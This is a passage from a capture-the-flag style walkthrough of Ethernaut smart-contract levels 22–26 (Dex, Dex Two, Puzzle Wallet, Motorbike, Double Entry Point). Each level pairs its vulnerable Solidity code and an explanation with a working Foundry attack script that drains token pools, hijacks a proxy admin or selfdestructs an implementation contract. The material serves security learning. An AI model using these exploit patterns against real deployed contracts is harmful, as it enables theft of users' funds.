\"Invalid tokens\");\n    require(IERC20(from).balanceOf(msg.sender) >= amount, \"Not enough to swap\");\n    uint swapAmount = getSwapPrice(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swapAmount);\n    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);\n  }\n\n  function getSwapPrice(address from, address to, uint amount) public\n  view returns(uint)\n  {\n    return((amount * IERC20(to).balanceOf(address(this)))/\n    IERC20(from).balanceOf(address(this)));\n  }\n\\`\\`\\`\n\n4.The \\`amount\\` is the amount of the tokens that added to the balance of \\`Dex\\` contract.\n\n5.\\`swapAmount\\` is the amount of tokens that goes to the \\`to\\` address from the balance of the \\`Dex\\` contract.\n\n6.When I started calculation for \\`swapAmount\\`, I have observed that swapping between two tokens slightly increases the balance of the \\`to\\` address.\n\n\\`\\`\\`\n\nFor the first swap:\nswap(Token1, Token2, 10)\nswapAmount = (10 * 100)/100 = 10 + balance of player in token2 is 10\n\t\t   => 20\n\nFor the second swap:\nswap(Token2, Token1, 20)\nswapAmount = (20*110)/90 = 24 + 0 =>24\n\nFor the third swap:\nswap(Token1, Token2, 24)\nswapAmount = (24*110)/86 = 30 + 0 => 30\n\nFor the fourth swap:\nswap(Token2, Token1, 30)\nswapAmount = (30*110)/80 = 41 + 0 => 41\n\nFor the fifth swap:\nswap(Token1, Token2, 41)\nswapAmount = (41*110)/69 = 65 + 0 => 65\n\nIf we swap(Token2, Token1, 65) then\nswapAmount = (65*110)/45 = 158 but the transaction would fail because the Dex\ndoes not have enough balance to execute the transaction.\n\nWe need to calculate the amountOfToken2ToSell in order to get back 110 Token1\n\n110 Token1 = amountOfToken2ToSell * DexBalanceOfToken1/DexBalanceOfToken2\n110 = amountOfToken2ToSell * 110/45\namountOfToken2ToSell = 45\n\nIf we swap token2 with amount 45 then the balanceOf Token1 in Dex is 0.\n\n\nSwap         |             Dex            |       User\n             |      Token1  | Token2      |  Token1 | Token2\n-----------------------------------------------------------\n Before Swap |     100      | 100         |  10     |  10\n First Swap  |     110      | 90          |  0      |  20\n Second Swap |     86       | 110         |  24     |  0\n Third Swap  |     110      | 80          |  0      |  30\n Fourth Swap |     69       | 110         |  41     |  0\n Fifth Swap  |     110      | 45          |  0      |  65\n\n Sixth Swap  |     0        | 90          |  110    |  20\n\n\\`\\`\\`\n\n**Level22Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Dex} from \"../src/Level22.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\n\ncontract Level22Sol is Script {\n    Dex public instance = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address token1 = instance.token1();\n        address token2 = instance.token2();\n\n        console.log(token1);\n\n        Attack attack = new Attack();\n\n        instance.approve(address(attack), 10);\n        address myAddress = address(vm.envAddress(\"MY_ADDRESS\"));\n        attack.exploit(myAddress);\n\n        console.log(\n            \"DEX balance in TOKEN1 is \",\n            instance.balanceOf(token1, address(instance))\n        );\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    Dex public dex = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);\n    address token1 = dex.token1();\n    address token2 = dex.token2();\n\n    function exploit(address myAddress) public {\n        IERC20(token1).transferFrom(myAddress, address(this), 10);\n        IERC20(token2).transferFrom(myAddress, address(this), 10);\n\n        dex.approve(address(dex), type(uint64).max);\n\n        dex.swap(token1, token2, 10);\n        dex.swap(token2, token1, 20);\n        dex.swap(token1, token2, 24);\n        dex.swap(token2, token1, 30);\n        dex.swap(token1, token2, 41);\n\n        dex.swap(token2, token1, 45);\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level22Solution.s.sol:Level22Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Dex Two\n\n**Level23.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\nimport 'openzeppelin-contracts/contracts/access/Ownable.sol';\n\ncontract DexTwo is Ownable(msg.sender) {\n  address public token1;\n  address public token2;\n  constructor() {}\n\n  function setTokens(address _token1, address _token2) public onlyOwner {\n    token1 = _token1;\n    token2 = _token2;\n  }\n\n  function add_liquidity(address token_address, uint amount) public onlyOwner {\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  }\n\n  function swap(address from, address to, uint amount) public {\n    require(IERC20(from).balanceOf(msg.sender) >= amount, \"Not enough to swap\");\n    uint swapAmount = getSwapAmount(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swapAmount);\n    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);\n  }\n\n  function getSwapAmount(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  }\n\n  function approve(address spender, uint amount) public {\n    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);\n    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);\n  }\n\n  function balanceOf(address token, address account) public view returns (uint){\n    return IERC20(token).balanceOf(account);\n  }\n}\n\ncontract SwappableTokenTwo is ERC20 {\n  address private _dex;\n  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n        _dex = dexInstance;\n  }\n\n  function approve(address owner, address spender, uint256 amount) public {\n    require(owner != _dex, \"InvalidApprover\");\n    super._approve(owner, spender, amount);\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nYou need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.\n\n**Explanation:**\n\n1. Observe that the \\`DexTwo\\` modifies the \\`swap()\\` function from the \\`Dex\\`. It removed the check of valid tokens.\n2. So, we are now allowed to input any token addresses to the swap() function.\n3. I created two Dummy Tokens and transferred 100 tokens each of the two tokens to the \\`Dex\\` address.\n4. I swapped my Dummy tokens with the \\`token1\\` and \\`token2\\` balances of the \\`Dex\\` contract.\n\n**Level23Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {DexTwo} from \"../src/Level23.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\n\ncontract Level23Sol is Script {\n    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address token1 = address(instance.token1());\n        address token2 = address(instance.token2());\n\n        Attack attack = new Attack();\n        attack.exploit();\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);\n\n    address token1 = address(instance.token1());\n    address token2 = address(instance.token2());\n\n    Dummy dummyToken1;\n\n    constructor() {\n        dummyToken1 = new Dummy();\n    }\n\n    function exploit() public {\n        dummyToken1.transfer(address(instance), 100); //transfering 100 tokens to the Dex contract\n\n        dummyToken1.approve(address(instance), 1000);\n\n        instance.swap(address(dummyToken1), token2, 100);\n        console.log(\n            \"token2 balance after swap  is \",\n            instance.balanceOf(token2, address(instance))\n        );\n\n        // dummyToken1.transfer(address(instance),100);//transfering 100 tokens to the Dex contract\n\n        dummyToken1.approve(address(instance), 1000);\n\n        instance.swap(address(dummyToken1), token1, 200);\n\n        console.log(\n            \"token1 balance after swap  is \",\n            instance.balanceOf(token1, address(instance))\n        );\n    }\n}\n\ncontract Dummy is ERC20(\"DummyToken\", \"Dummy\") {\n    constructor() {\n        _mint(msg.sender, 10000);\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level23Solution.s.sol:Level23Sol --rpc-url $RPC_URL --broadcast\n\n\\`\\`\\`\n\n## Puzzle Wallet\n\n**Level24.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma experimental ABIEncoderV2;\n\nimport \"./helpers/UpgradeableProxy-08.sol\";\n\ncontract PuzzleProxy is UpgradeableProxy {\n    address public pendingAdmin;\n    address public admin;\n\n    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {\n        admin = _admin;\n    }\n\n    modifier onlyAdmin {\n      require(msg.sender == admin, \"Caller is not the admin\");\n      _;\n    }\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {\n        require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");\n        admin = pendingAdmin;\n    }\n\n    function upgradeTo(address _newImplementation) external onlyAdmin {\n        _upgradeTo(_newImplementation);\n    }\n}\n\ncontract PuzzleWallet {\n    address public owner;\n    uint256 public maxBalance;\n    mapping(address => bool) public whitelisted;\n    mapping(address => uint256) public balances;\n\n    function init(uint256 _maxBalance) public {\n        require(maxBalance == 0, \"Already initialized\");\n        maxBalance = _maxBalance;\n        owner = msg.sender;\n    }\n\n    modifier onlyWhitelisted {\n        require(whitelisted[msg.sender], \"Not whitelisted\");\n        _;\n    }\n\n    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      maxBalance = _maxBalance;\n    }\n\n    function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        whitelisted[addr] = true;\n    }\n\n    function deposit() external payable onlyWhitelisted {\n      require(address(this).balance <= maxBalance, \"Max balance reached\");\n      balances[msg.sender] += msg.value;\n    }\n\n    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {\n        require(balances[msg.sender] >= value, \"Insufficient balance\");\n        balances[msg.sender] -= value;\n        (bool success, ) = to.call{ value: value }(data);\n        require(success, \"Execution failed\");\n    }\n\n    function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n        bool depositCalled = false;\n        for (uint256 i = 0; i < data.length; i++) {\n            bytes memory _data = data[i];\n            bytes4 selector;\n            assembly {\n                selector := mload(add(_data, 32))\n            }\n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n\\`\\`\\`\n\n**Goal:**\n\nYou’ll need to hijack this wallet to become the admin of the proxy.\n\n**Explanation:**\n\n1. \\`PuzzleProxy\\` is a proxy contract and \\`PuzzleWallet\\` is an implementation contract.\n2. Calls to \\`PuzzleProxy\\` will be forwarded to the \\`PuzzleWallet\\` through \\`delegatecall\\`.\n3. Here, the storage layout of the two contracts are not matched. It may lead to storage collisions.\n4. We need to become the admin of the proxy contract.\n5. We can propose a new admin which will update the \\`pendingAdmin\\` variable in PuzzleProxy as well as the \\`owner\\` inside PuzzleWallet. Because of storage collision.\n6. Then call the \\`addToWhiteList()\\` with our Attacker address to be able to call other functions of PuzzleWallet.\n7. To override the \\`admin\\` variable in PuzzleProxy contract we have to change the \\`maxPrice\\` variable to address of our Attacker.\n8. To update \\`maxPrice\\` we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the \\`execute()\\` function.\n9. If we somehow able to pass this \\`require(balances[msg.sender] >= value, \"Insufficient balance\");\\` check we can withdraw more ether from wallet.\n10. To do so, we need to send 0.001 ether only to the wallet, but we need to update the \\`balance[msg.sender]\\` to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.\n11. We can use the \\`multicall()\\` function to do this, we call the \\`multicall()\\` with 0.001 ether and pass the function signature of the \\`deposit()\\` so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.\n12. We cant call \\`deposit()\\` twice in a single call by passing calldata as [signature of \\`deposit\\` + signature of \\`deposit\\`]. As there is a check to catch this case.\n13. But we can send the singature of the \\`deposit()\\` and a call to \\`multicall()\\` again with the \\`deposit()\\` signature.\n14. That is we are calling multicall with a \\`deposit()\\` calldata along with multicall calldata with \\`deposit()\\` signature. i.e, a nested multicall.\n15. This will modify the \\`balance[msg.sender]\\` twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.\n16. Now we have enough \\`balance[msg.sender]\\` to pass the check done in \\`execute()\\` function.\n17. So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes \\`zero\\`.\n\n**Level24Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport \"../src/Level24.sol\";\n\ncontract Level24Sol is Script {\n    PuzzleProxy public proxy =\n        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));\n    PuzzleWallet public wallet =\n        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(\"Wallet Owner  :\", wallet.owner());\n        console.log(\"Proxy Admin :\", proxy.admin());\n        console.log(\"Wallet Max Balance : \", wallet.maxBalance());\n        console.log(\"Proxy Pending Admin : \", proxy.pendingAdmin());\n        console.log(\"Wallet balance : \", address(wallet).balance);\n\n        Attack attack = new Attack();\n\n        attack.exploit{value: 0.001 ether}();\n\n        console.log(\"Wallet Owner  :\", wallet.owner());\n        console.log(\"Proxy Admin :\", proxy.admin());\n        console.log(\"Wallet Max Balance : \", wallet.maxBalance());\n        console.log(\"Proxy Pending Admin : \", proxy.pendingAdmin());\n        console.log(\"Wallet balance : \", address(wallet).balance);\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    PuzzleProxy public proxy =\n        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));\n    PuzzleWallet public wallet =\n        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);\n\n    function exploit() public payable {\n        proxy.proposeNewAdmin(address(this));\n\n        wallet.addToWhitelist(address(this));\n\n        bytes[] memory _depositData = new bytes[](1);\n        _depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);\n\n        bytes[] memory data = new bytes[](2);\n        data[0] = _depositData[0];\n        data[1] = abi.encodeWithSelector(\n            wallet.multicall.selector,\n            _depositData\n        ); // nested multicalling\n\n        wallet.multicall{value: 0.001 ether}(data);\n\n        wallet.execute(address(this), 0.002 ether, \"\");\n\n        wallet.setMaxBalance(\n            uint256(\n                uint160(address(0x2e118e720e4142E75fC79a0f57745Af650d39F94))\n            )\n        );\n    }\n\n    receive() external payable {}\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level24Solution.s.sol:Level24Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Motorbike\n\n**Level25.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity <0.7.0;\n\nimport \"openzeppelin-contracts-06/utils/Address.sol\";\nimport \"openzeppelin-contracts-06/proxy/Initializable.sol\";\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by \\`_logic\\`.\n    constructor(address _logic) public {\n        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success,) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")//we can able to call the initialize() again since it is a delegate call.\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to \\`implementation\\`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by \\`_implementation()\\`.\n    // Will run if no other function in the contract matches the call data\n    fallback () external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an \\`AddressSlot\\` with member \\`value\\` located at \\`slot\\`.\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r_slot := slot\n        }\n    }\n}\n/*\n*/\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n//this initializer modifier prevents the function from being  calling twice.\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to \\`newImplementation\\`\n    // subsequently execute the function call\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0) {\n            (bool success,) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n\n        AddressSlot storage r;\n        assembly {\n            r_slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWould you be able to selfdestruct its engine and make the motorbike unusable ?\n\n**Explanation:**\n\n1. This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.\n2. This time no storage collison is happened.\n3. We need to change the \\`upgrader\\` of the Engine contract and \\`selfdestruct\\` the Engine contract.\n4. We have to write an Attack contract which has the selfdestruct function and change the implementation address.\n5. We see only one time the \\`upgrader\\` was assigned inside Engine contract, that is inside \\`initialize()\\` function. And this initialize function was called inside the constructor of the Motobike.\n6. But observe that this call was done using \\`delegatecall\\`, which is done in the context of the Motorbike. Not the Engine contract.\n7. This means the \\`initialize()\\` function can be called again as the \\`intializer\\` modfier not updated.\n8. By calling \\`intialize()\\`, we will become the upgrader of the Engine contract.\n9. Now, we can update the implementation addres by calling \\`upgradeToAndCall()\\` function and pass the data as the signature of the \\`destructEngine()\\` function to be called by the Engine contract.\n10. This will destruct the Engine contract, because the call was done using \\`delegatecall\\` so the storage of the Engine will be affected.\n\n**Level25Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity <0.7.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport \"../src/Level25.sol\";\n\ncontract Level25Sol is Script {\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    Motorbike instance = Motorbike(0x20072a9B2075f613965e9AE956de56E2d68A45B2);\n\n    Engine engineAddress =\n        Engine(\n            address(\n                uint160(\n                    uint256(vm.load(address(instance), _IMPLEMENTATION_SLOT))\n                )\n            )\n        );\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(address(engineAddress));\n        new Attack().exploit(address(engineAddress));\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    Engine public engine;\n\n    function exploit(address _engine) public {\n        engine = Engine(_engine);\n\n        engine.initialize();\n\n        console.log(engine.upgrader());\n\n        bytes memory killSelector = abi.encodeWithSelector(this.kill.selector);\n\n        engine.upgradeToAndCall(address(this), killSelector);\n    }\n\n    function kill() external {\n        selfdestruct(payable(address(this)));\n    }\n\n    receive() external payable {}\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level25Solution.s.sol:Level25Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Double Entry Point\n\n**Level26.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"openzeppelin-contracts-06/access/Ownable.sol\";\nimport \"openzeppelin-contracts-06/token/ERC20/ERC20.sol\";\n\ninterface DelegateERC20 {\n    function delegateTransfer(\n        address to,\n        uint256 value,\n        address origSender\n    ) external returns (bool);\n}\n\ninterface IDetectionBot {\n    function handleTransaction(address user, bytes calldata msgData) external;\n}\n\ninterface IForta {\n    function setDetectionBot(address detectionBotAddress) external;\n\n    function notify(address user, bytes calldata msgData) external;\n\n    function raiseAlert(address user) external;\n}\n\ncontract Forta is IForta {\n    mapping(address => IDetectionBot) public usersDetectionBots;\n    mapping(address => uint256) public botRaisedAlerts;\n\n    function setDetectionBot(address detectionBotAddress) external override {\n        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);\n    }\n\n    function notify(address user, bytes calldata msgData) external override {\n        if (address(usersDetectionBots[user]) == address(0)) return;\n        try usersDetectionBots[user].handleTransaction(user, msgData) {\n            return;\n        } catch {}\n    }\n\n    function raiseAlert(address user) external override {\n        if (address(usersDetectionBots[user]) != msg.sender) return;\n        botRaisedAlerts[msg.sender] += 1;\n    }\n}\n\ncontract CryptoVault {\n    address public sweptTokensRecipient;\n    IERC20 public underlying; //doubleentrypoint\n\n    constructor(address recipient) {\n        sweptTokensRecipient = recipient;\n    }\n\n    function setUnderlying(address latestToken) public {\n        require(address(underlying) == address(0), \"Already set\");\n        underlying = IERC20(latestToken);\n    }\n\n    /*\n    ...\n    */\n\n    function sweepToken(IERC20 token) public {\n        require(token != underlying, \"Can't transfer underlying token\");\n        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));\n    }\n}\n\ncontract LegacyToken is ERC20(\"LegacyToken\", \"LGT\"), Ownable {\n    DelegateERC20 public delegate; //delegate is doublEntry  point  contract itself.\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n\n    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {\n        delegate = newContract;\n    }\n\n    function transfer(\n        address to,\n        uint256 value\n    ) public override returns (bool) {\n        if (address(delegate) == address(0)) {\n            return super.transfer(to, value);\n        } else {\n            return delegate.delegateTransfer(to, value, msg.sender);\n        }\n    }\n}\n\ncontract DoubleEntryPoint is\n    ERC20(\"DoubleEntryPointToken\", \"DET\"),\n    DelegateERC20,\n    Ownable\n{\n    address public cryptoVault;\n    address public player;\n    address public delegatedFrom;\n    Forta public forta;\n\n    constructor(\n        address legacyToken,\n        address vaultAddress,\n        address fortaAddress,\n        address playerAddress\n    ) {\n        delegatedFrom = legacyToken;\n        forta = Forta(fortaAddress);\n        player = playerAddress;\n        cryptoVault = vaultAddress;\n        _mint(cryptoVault, 100 ether);\n    }\n\n    modifier onlyDelegateFrom() {\n        require(msg.sender == delegatedFrom, \"Not legacy contract\");\n        _;\n    }\n\n    modifier fortaNotify() {\n        address detectionBot = address(forta.usersDetectionBots(player));\n\n        // Cache old number of bot alerts\n        uint256 previousValue = forta.botRaisedAlerts(detectionBot);\n\n        // Notify Forta\n        forta.notify(player, msg.data);\n\n        // Continue execution\n        _;\n\n        // Check if alarms have been raised\n        if (forta.botRaisedAlerts(detectionBot) > previousValue)\n            revert(\"Alert has been triggered, reverting\");\n    }\n\n    function delegateTransfer(\n        address to,\n        uint256 value,\n        address origSender\n    ) public override onlyDelegateFrom fortaNotify returns (bool) {\n        _transfer(origSender, to, value);\n        return true;\n    }\n}\n\n\\`\\`\\`\n\n**Goal:**\n\nDrain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.\n\n**Explanation:**\n\n1. There are four contracts in total \\`CryptoVault\\`, \\`DoubleEntryPoint\\`, \\`LegacyToken\\` and \\`Forta\\`.\n2. CryptoVault implemented \\`sweepToken()\\` function which allows us to sweep all the tokens from the CryptoVault except the \\`underlying\\` tokens.\n3. The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.\n4. LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault.\n5. \\`LegacyToken\\` also has function \\`transfer()\\` which is where the bug is,\n\n\\`\\`\\`solidity\n function transfer(\n        address to,\n        uint256 value\n    ) public override returns (bool) {\n        if (address(delegate) == address(0)) {\n            return super.transfer(to, value);\n        } else {\n            return delegate.delegateTransfer(to, value, msg.sender);\n        }\n    }\n\\`\\`\\`\n\n6. When I checked, the \\`delegate\\` is actually the address of the \\`DoubleEntryPoint\\` and it is assigned to delegate in LegacyToken contract.\n\n![Delegate Address Screenshot](/images/ethernaut-delegate-address.png)\n\n\\`\\`\\`\n foundry command: $ cast 4 0xc89e4361\n Output:          delegate()\n\\`\\`\\`\n\n7. Here the \\`delegate\\` == \\`DET\\` address. Which means the LegacyToken contract is calling the \\`delegateTransfer()\\` function of \\`DoubleEntryPoint\\` contract. See the \\`delegateTransfer()\\` function below and observe what it is doing.\n\n\\`\\`\\`solidity\n function delegateTransfer(\n        address to,\n        uint256 value,\n        address origSender\n    ) public override onlyDelegateFrom fortaNotify returns (bool) {\n        _transfer(origSender, to, value);\n        return true;\n    }\n\\`\\`\\`\n\n8. Its sending the \\`DET\\` tokens to the \\`to\\` address from the \\`origSender\\` of \\`value\\`.\n\n9. When this function executes it transfers DET tokens of \\`origSender\\` to the \\`to\\` address. \\`CryptoVault\\` holds 100 DET tokens.\n\n10. So, if the \\`origSender\\` is CryptoVault and the call to \\`delegateTransfer()\\` was made by \\`LegacyToken\\` and no alerts from the \\`fortaNotify\\` will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)\n\n11. The \\`delegateTransfer()\\` is called by LegacyToken contract from the \\`transfer()\\` function. The \\`origSender\\` is the \\`msg.sender\\` of transfer() function in LegacyToken.\n\n12. So, we have to make the CryptoVault to call the \\`transfer()\\` function of the LegacyToken.\n\n13. We see the one \\`transfer()\\` call is made on the \\`token\\` by CryptoVault inside \\`sweepToken()\\` function.\n\n\\`\\`\\`solidity\nfunction sweepToken(IERC20 token) public {\n        require(token != underlying, \"Can't transfer underlying token\");\n        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));\n    }\n\\`\\`\\`\n\n14. To make the LegacyToken \\`tranfer()\\` called by the CryptoVault, we need to pass the LegacyToken instance to the \\`sweepToken()\\` function.\n\n15. Now the \\`CryptoVault\\` balance of DET token becomes zero.\n\n16. We identified the bug and sweeped out the DET tokens of the CryptoVault.\n\n17. Now we have to write a \\`detectionbot\\` to catch this bug. We are given with \\`Forta\\` interface which can be used to build the bot.\n\n18. We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.\n\n19. The \\`msg.data\\` that received at \\`fortNotify()\\`\n\n\\`\\`\\`\ndata = <delegateTransfer() signature> <to> <value> <origSender>\n\\`\\`\\`\n\n20. If we access \\`msg.data\\` inside \\`handleTransaction()\\`,\n\n\\`\\`\\`\nmsg.data = <handleTransaction() signature> <user> <data>\n\\`\\`\\`\n\n21. We need to extract \\`origSender\\` from the \\`msg.data\\` inside \\`handleTransaction()\\` function implemented in our bot contract.\n\n22. Lets see how the calldata at \\`handleTransaction()\\` is looks like,\n\n\\`\\`\\`\n0x00 : handleTransaction signature[4 bytes]\n0x04 : 0000....0000 // <user> address\n0x24 : 0000....0000 // offset of the <data>\n0x44 : 0000....0000 // length of the <data>\n---------start of the data---------\n0x64 : <delegateTransfer() signature> [4 bytes]\n0x68 : 0000....0000 // <to> address\n0x88 : 0000....0000 // <value>\n0xA8 : 0000....0000 // <origSender>\n\\`\\`\\`\n\n23. So, the \\`origSender\\` is from the \\`0xA8\\` byte of the \\`msg.data\\` inside \\`handleTransaction()\\` function.\n\n24. We can use \\`calldataload\\` opcode to access the \\`origSender\\`. And if the origSender is equals to CryptoVault then raise an alert.\n\n25. Now the bot is ready, we have to deploy it and register the bot at \\`Forta\\` contract.\n\n**Level26Solution.s.sol**\n\n\\`\\`\\`solidity\n//SPDX-License-Identifier :MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level26.sol\";\n\ncontract Level26Sol is Script{\n\n    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);\n\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address cryptoVault = 